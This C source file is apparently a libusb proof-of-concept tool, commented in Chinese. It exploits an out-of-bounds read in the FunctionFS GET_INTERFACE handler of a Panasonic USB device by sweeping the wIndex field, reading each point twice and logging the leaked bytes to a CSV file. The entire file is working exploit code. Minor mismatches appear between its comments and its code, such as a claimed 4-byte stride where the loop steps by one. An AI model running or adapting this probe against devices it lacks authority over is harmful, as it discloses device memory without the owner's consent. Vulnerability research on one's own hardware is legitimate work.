// ffs_probe.c — S1M2 FunctionFS F2 越界读探测（只读）
// 依据: Yooglery S1RM2 POC + 维护者 S1M2 官方源码核验
//   F2: GET_INTERFACE (bmRequestType=0x81, bRequest=0x0A, wValue=0, wIndex=0x0100*n, wLength=1)
// 用法: ./ffs_probe [timeout_ms] [full|points]
// 编译: clang -I/opt/homebrew/opt/libusb/include/libusb-1.0 -L/opt/homebrew/lib -lusb-1.0 -o ffs_probe ffs_probe.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libusb.h>

static int g_timeout_ms = 500;

static void note(const char *s) { fprintf(stderr, "[*] %s\n", s); fflush(stderr); }

static void dump_one(libusb_device_handle *h, uint16_t wi, FILE *csv) {
    unsigned char b1 = 0xFF, b2 = 0xFF;
    int r1 = libusb_control_transfer(h, 0x81, 0x0A, 0x0000, wi, &b1, 1, g_timeout_ms);
    int r2 = libusb_control_transfer(h, 0x81, 0x0A, 0x0000, wi, &b2, 1, g_timeout_ms);
    if (r1 == 1 && r2 == 1)
        printf("0x%04x : 0x%02x  0x%02x%s\n", wi, b1, b2, b1 == b2 ? "  stable" : "");
    else if (r1 == 1)
        printf("0x%04x : 0x%02x  %s\n", wi, b1, libusb_error_name(r2));
    else if (r2 == 1)
        printf("0x%04x : %s  0x%02x\n", wi, libusb_error_name(r1), b2);
    else
        printf("0x%04x : %s  %s\n", wi, libusb_error_name(r1), libusb_error_name(r2));
    if (csv) {
        char s1[16], s2[16];
        snprintf(s1, sizeof(s1), r1 == 1 ? "0x%02x" : "-", b1);
        snprintf(s2, sizeof(s2), r2 == 1 ? "0x%02x" : "-", b2);
        fprintf(csv, "0x%04x,%s,%s\n", wi, s1, s2);
    }
    fflush(stdout);
}

int main(int argc, char **argv) {
    if (argc > 1) g_timeout_ms = atoi(argv[1]);
    int full = argc > 2 && strcmp(argv[2], "full") == 0;
    int fine = argc > 2 && strcmp(argv[2], "fine") == 0;
    unsigned fine_start = fine && argc > 3 ? (unsigned)strtoul(argv[3], NULL, 16) : 0;
    unsigned fine_end   = fine && argc > 4 ? (unsigned)strtoul(argv[4], NULL, 16) : 0;
    setvbuf(stdout, NULL, _IOLBF, 0);
    if (libusb_init(NULL) != 0) { note("libusb_init failed"); return 1; }

    libusb_device **list;
    ssize_t n = libusb_get_device_list(NULL, &list);
    if (n < 0) { note("device list failed"); return 1; }

    libusb_device *dev = NULL;
    for (ssize_t i = 0; i < n; i++) {
        struct libusb_device_descriptor dd;
        if (libusb_get_device_descriptor(list[i], &dd) == 0 && dd.idVendor == 0x04DA) {
            dev = list[i];
            printf("found %04x:%04x bus=%d addr=%d\n", dd.idVendor, dd.idProduct,
                   libusb_get_bus_number(dev), libusb_get_device_address(dev));
        }
    }
    if (!dev) { note("no Panasonic device"); return 1; }

    struct libusb_config_descriptor *cfg = NULL;
    if (libusb_get_active_config_descriptor(dev, &cfg) == 0 && cfg) {
        for (int i = 0; i < cfg->bNumInterfaces; i++) {
            const struct libusb_interface_descriptor *id = &cfg->interface[i].altsetting[0];
            printf("  if%d: class=0x%02x sub=0x%02x proto=0x%02x eps=%d\n",
                   id->bInterfaceNumber, id->bInterfaceClass, id->bInterfaceSubClass,
                   id->bInterfaceProtocol, id->bNumEndpoints);
        }
    }

    libusb_device_handle *h = NULL;
    int r = libusb_open(dev, &h);
    if (r != 0) { note(libusb_error_name(r)); return 1; }

    FILE *csv = fopen("ffs_leak.csv", "w");
    if (csv) fprintf(csv, "wIndex,pass1,pass2\n");
    if (full) {
        note("full scan 0x0000..0xFF00 step 0x100, two reads per point");
        for (uint32_t wi = 0; wi <= 0xFF00; wi += 0x100)
            dump_one(h, (uint16_t)wi, csv);
    } else if (fine) {
        fprintf(stderr, "[*] fine scan (4-byte stride) 0x%04x..0x%04x, two reads per point\n", fine_start, fine_end);
        for (uint32_t wi = fine_start; wi <= fine_end; wi++)
            dump_one(h, (uint16_t)wi, csv);
    } else {
        const uint16_t pts[] = {0x0000, 0x0100, 0x0300, 0x0a00, 0x1000, 0x4000, 0xFF00};
        for (size_t i = 0; i < sizeof(pts) / sizeof(pts[0]); i++)
            dump_one(h, pts[i], csv);
    }
    if (csv) fclose(csv);
    libusb_close(h);
    libusb_free_device_list(list, 1);
    libusb_exit(NULL);
    note("done");
    return 0;
}
